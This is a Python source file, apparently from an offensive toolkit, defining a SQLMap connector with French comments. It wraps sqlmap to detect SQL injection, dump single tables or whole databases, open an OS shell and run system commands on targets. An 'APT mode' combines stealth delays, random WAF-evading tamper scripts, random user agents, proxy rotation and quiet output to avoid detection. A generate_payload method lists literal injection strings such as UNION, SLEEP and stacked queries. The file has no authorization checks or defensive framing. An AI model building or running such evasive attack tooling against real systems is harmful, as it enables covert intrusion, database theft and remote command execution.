#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Connecteur pour SQLMap - Injection SQL automatisée
Version avec support furtif, APT et techniques avancées
"""

import re
import json
import random
from typing import Dict, Any, List, Optional
from pathlib import Path
from datetime import datetime

from src.connectors.base_connector import BaseConnector


class SQLMapConnector(BaseConnector):
    """Connecteur avancé pour SQLMap avec support furtif"""
    
    def __init__(self, tool_path: Optional[str] = None):
        """
        Initialise le connecteur SQLMap
        
        Args:
            tool_path: Chemin personnalisé vers l'exécutable SQLMap
        """
        super().__init__(tool_path)
        self.techniques_map = {
            'B': 'Boolean-based blind',
            'E': 'Error-based',
            'U': 'Union query',
            'S': 'Stacked queries',
            'T': 'Time-based blind',
            'Q': 'Inline queries'
        }
        self.tampers = [
            "between", "chardoubleencode", "charencode", "charunicodeencode",
            "equivalence", "greatest", "ifnull2ifisnull", "modsecurityversioned",
            "modsecurityzeroversioned", "randomcase", "space2comment", "space2plus",
            "space2randomblank", "unionalltounion", "unmagicquotes"
        ]
    
    def _find_tool(self) -> Optional[str]:
        """Trouve l'exécutable SQLMap"""
        import shutil
        
        paths = [
            "sqlmap",
            "/usr/bin/sqlmap",
            "/usr/local/bin/sqlmap",
            "/opt/sqlmap/sqlmap.py",
            "/usr/share/sqlmap/sqlmap.py"
        ]
        
        for path in paths:
            if path and shutil.which(path):
                return path
        
        # Vérifier le script Python
        python_script = shutil.which("python3")
        if python_script:
            import subprocess
            try:
                result = subprocess.run(
                    ["find", "/usr", "-name", "sqlmap.py"], 
                    capture_output=True, text=True, timeout=5
                )
                if result.stdout.strip():
                    return f"python3 {result.stdout.strip()}"
            except:
                pass
        
        return None
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les injections SQL avec SQLMap
        
        Args:
            target: URL cible
            **kwargs:
                - data: Données POST
                - cookie: Cookie de session
                - level: Niveau de risque (1-5)
                - risk: Risque (1-3)
                - techniques: Techniques à utiliser (B,E,U,S,T,Q)
                - dbms: Type de base de données
                - threads: Nombre de threads
                - delay: Délai entre les requêtes
                - tamper: Tamper scripts à utiliser
                - proxy: Proxy à utiliser
        """
        if not self.available:
            return {
                "success": False,
                "error": "SQLMap non installé",
                "vulnerable": False,
                "databases": [],
                "apt_mode": self.apt_mode
            }
        
        # Appliquer le délai furtif
        self._apply_stealth_delay()
        
        cmd = [self.tool_path, "-u", target]
        
        # Mode APT: ralentir et réduire la détection
        if self.apt_mode:
            kwargs.setdefault('delay', 2)
            kwargs.setdefault('level', 1)
            kwargs.setdefault('risk', 1)
            kwargs.setdefault('threads', 1)
            kwargs.setdefault('techniques', 'T')  # Time-based seulement
            kwargs['random_agent'] = True
            kwargs['batch'] = True
        
        # Données POST
        data = kwargs.get('data')
        if data:
            cmd.extend(["--data", data])
        
        # Cookie
        cookie = kwargs.get('cookie')
        if cookie:
            cmd.extend(["--cookie", cookie])
        
        # Headers
        headers = kwargs.get('headers', {})
        for key, value in headers.items():
            cmd.extend(["-H", f"{key}: {value}"])
        
        # Niveau et risque
        level = kwargs.get('level', 1)
        cmd.extend(["--level", str(level)])
        
        risk = kwargs.get('risk', 1)
        cmd.extend(["--risk", str(risk)])
        
        # Techniques
        techniques = kwargs.get('techniques')
        if techniques:
            cmd.extend(["--technique", techniques])
        
        # DBMS
        dbms = kwargs.get('dbms')
        if dbms:
            cmd.extend(["--dbms", dbms])
        
        # Threads (limités en mode APT)
        threads = kwargs.get('threads', 1)
        if self.apt_mode:
            threads = min(threads, 1)
        cmd.extend(["--threads", str(threads)])
        
        # Délai entre les requêtes (mode furtif)
        delay = kwargs.get('delay')
        if delay:
            cmd.extend(["--delay", str(delay)])
        elif self.stealth_config.get('random_delays', False):
            min_delay, max_delay = self.stealth_config.get('delay', (0.5, 1.5))
            avg_delay = (min_delay + max_delay) / 2
            cmd.extend(["--delay", str(round(avg_delay, 1))])
        
        # Tamper scripts
        tamper = kwargs.get('tamper')
        if tamper:
            if isinstance(tamper, list):
                tamper = ','.join(tamper)
            cmd.extend(["--tamper", tamper])
        elif self.apt_mode:
            # Sélectionner un tamper aléatoire pour éviter la détection
            random_tamper = random.choice(self.tampers[:5])
            cmd.extend(["--tamper", random_tamper])
        
        # Options de furtivité
        if kwargs.get('random_agent', False) or self.apt_mode:
            cmd.append("--random-agent")
        
        if kwargs.get('batch', True):
            cmd.append("--batch")
        
        if kwargs.get('verbose'):
            cmd.append("-v")
        elif self.apt_mode:
            cmd.append("-v 0")  # Pas de verbosité
        
        if kwargs.get('quiet') or self.apt_mode:
            cmd.append("--quiet")
        
        # Proxy
        proxy = kwargs.get('proxy')
        if proxy:
            cmd.extend(["--proxy", proxy])
        elif self.proxy_rotation:
            proxy = self._get_next_proxy()
            if proxy:
                cmd.extend(["--proxy", proxy])
        
        # Sortie
        output_file = kwargs.get('output')
        if output_file:
            cmd.extend(["-o", output_file])
        
        # Options supplémentaires
        if kwargs.get('flush_session'):
            cmd.append("--flush-session")
        
        if kwargs.get('fresh_queries'):
            cmd.append("--fresh-queries")
        
        if kwargs.get('skip_waf'):
            cmd.append("--skip-waf")
        
        # Timeout
        timeout = kwargs.get('timeout', 900)
        
        # Exécution
        result = self.execute_command(cmd, timeout=timeout)
        
        # Analyser les résultats
        is_vulnerable = self._is_vulnerable(result["stdout"])
        
        if is_vulnerable:
            databases = self.parse_output(result["stdout"])
            return {
                "success": True,
                "target": target,
                "vulnerable": True,
                "databases": databases,
                "count": len(databases),
                "raw_output": result["stdout"],
                "execution_time": result.get("execution_time", 0),
                "command_used": ' '.join(cmd),
                "apt_mode": self.apt_mode
            }
        else:
            return {
                "success": True,
                "target": target,
                "vulnerable": False,
                "databases": [],
                "message": "Aucune injection SQL détectée",
                "apt_mode": self.apt_mode
            }
    
    def parse_output(self, output: str) -> List[Dict[str, Any]]:
        """
        Parse la sortie de SQLMap
        
        Args:
            output: Sortie brute de SQLMap
            
        Returns:
            Liste des bases de données trouvées
        """
        databases = []
        
        # Pattern pour les bases de données
        db_pattern = r'\[\*\] ([^\s]+)\s+\[(\d+)\]'
        
        for line in output.split('\n'):
            match = re.search(db_pattern, line)
            if match:
                databases.append({
                    "name": match.group(1),
                    "tables_count": int(match.group(2)),
                    "tables": []
                })
        
        # Pattern pour les tables
        table_pattern = r'\| ([^\s|]+)\s+\|'
        
        current_db = None
        for line in output.split('\n'):
            if "Database:" in line:
                current_db = line.split("Database:")[1].strip()
            elif table_pattern and current_db:
                match = re.search(table_pattern, line)
                if match and match.group(1) not in ['Table', '---']:
                    for db in databases:
                        if db["name"] == current_db:
                            db["tables"].append(match.group(1))
        
        return databases
    
    def _is_vulnerable(self, output: str) -> bool:
        """
        Détermine si une vulnérabilité SQLi a été trouvée
        
        Args:
            output: Sortie de SQLMap
            
        Returns:
            True si vulnérabilité détectée
        """
        indicators = [
            "vulnerable",
            "parameter is vulnerable",
            "injection",
            "sqlmap identified the following injection point",
            "payload",
            "target is vulnerable"
        ]
        
        return any(indicator in output.lower() for indicator in indicators)
    
    def enumerate_databases(self, target: str, **kwargs) -> Dict[str, Any]:
        """Énumère toutes les bases de données"""
        kwargs['batch'] = True
        return self.scan(target, **kwargs)
    
    def dump_table(self, target: str, database: str, table: str, **kwargs) -> Dict[str, Any]:
        """
        Extrait le contenu d'une table
        
        Args:
            target: URL cible
            database: Nom de la base de données
            table: Nom de la table
            **kwargs: Options supplémentaires
        """
        cmd = [self.tool_path, "-u", target, "-D", database, "-T", table, "--dump"]
        
        if kwargs.get('batch', True):
            cmd.append("--batch")
        
        if kwargs.get('columns'):
            cmd.extend(["-C", kwargs['columns']])
        
        if kwargs.get('where'):
            cmd.extend(["--where", kwargs['where']])
        
        if kwargs.get('start'):
            cmd.extend(["--start", str(kwargs['start'])])
        
        if kwargs.get('stop'):
            cmd.extend(["--stop", str(kwargs['stop'])])
        
        if kwargs.get('no_cast'):
            cmd.append("--no-cast")
        
        timeout = kwargs.get('timeout', 1200)
        
        result = self.execute_command(cmd, timeout=timeout)
        
        return {
            "success": result["success"],
            "database": database,
            "table": table,
            "output": result["stdout"],
            "execution_time": result.get("execution_time", 0)
        }
    
    def dump_database(self, target: str, database: str, **kwargs) -> Dict[str, Any]:
        """
        Extrait toutes les tables d'une base de données
        
        Args:
            target: URL cible
            database: Nom de la base de données
            **kwargs: Options supplémentaires
        """
        cmd = [self.tool_path, "-u", target, "-D", database, "--dump-all"]
        
        if kwargs.get('batch', True):
            cmd.append("--batch")
        
        timeout = kwargs.get('timeout', 3600)
        
        result = self.execute_command(cmd, timeout=timeout)
        
        return {
            "success": result["success"],
            "database": database,
            "output": result["stdout"],
            "execution_time": result.get("execution_time", 0)
        }
    
    def os_shell(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Tente d'obtenir un shell système via SQLi
        
        Args:
            target: URL cible
            **kwargs: Options supplémentaires
        """
        cmd = [self.tool_path, "-u", target, "--os-shell"]
        
        if kwargs.get('batch', True):
            cmd.append("--batch")
        
        timeout = kwargs.get('timeout', 600)
        
        result = self.execute_command(cmd, timeout=timeout)
        
        return {
            "success": "os-shell" in result["stdout"].lower(),
            "output": result["stdout"],
            "execution_time": result.get("execution_time", 0)
        }
    
    def os_cmd(self, target: str, command: str, **kwargs) -> Dict[str, Any]:
        """
        Exécute une commande système via SQLi
        
        Args:
            target: URL cible
            command: Commande à exécuter
            **kwargs: Options supplémentaires
        """
        cmd = [self.tool_path, "-u", target, "--os-cmd", command]
        
        if kwargs.get('batch', True):
            cmd.append("--batch")
        
        timeout = kwargs.get('timeout', 300)
        
        result = self.execute_command(cmd, timeout=timeout)
        
        return {
            "success": result["success"],
            "command": command,
            "output": result["stdout"],
            "execution_time": result.get("execution_time", 0)
        }
    
    def get_version_info(self) -> Dict[str, Any]:
        """
        Récupère les informations de version de SQLMap
        
        Returns:
            Dictionnaire avec les informations de version
        """
        if not self.available:
            return {"available": False}
        
        result = self.execute_command([self.tool_path, "--version"], stealth=False)
        
        if result["success"]:
            version_line = result["stdout"].split('\n')[0] if result["stdout"] else ""
            return {
                "available": True,
                "version": version_line,
                "tool": "sqlmap",
                "path": self.tool_path
            }
        
        return {"available": False, "error": result.get("error")}
    
    def get_tampers(self) -> List[str]:
        """
        Retourne la liste des tamper scripts disponibles
        
        Returns:
            Liste des tamper scripts
        """
        return self.tampers
    
    def generate_payload(self, technique: str = 'T', delay: int = 5) -> str:
        """
        Génère un payload SQLi pour test manuel
        
        Args:
            technique: Technique (B,E,U,S,T,Q)
            delay: Délai pour time-based
            
        Returns:
            Payload SQLi
        """
        payloads = {
            'B': "1' AND '1'='1",
            'E': "1' AND extractvalue(1,concat(0x7e,version()))--",
            'U': "1' UNION SELECT NULL--",
            'S': "1'; SELECT * FROM users--",
            'T': f"1' AND SLEEP({delay})--",
            'Q': "1' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)--"
        }
        
        return payloads.get(technique, payloads['T'])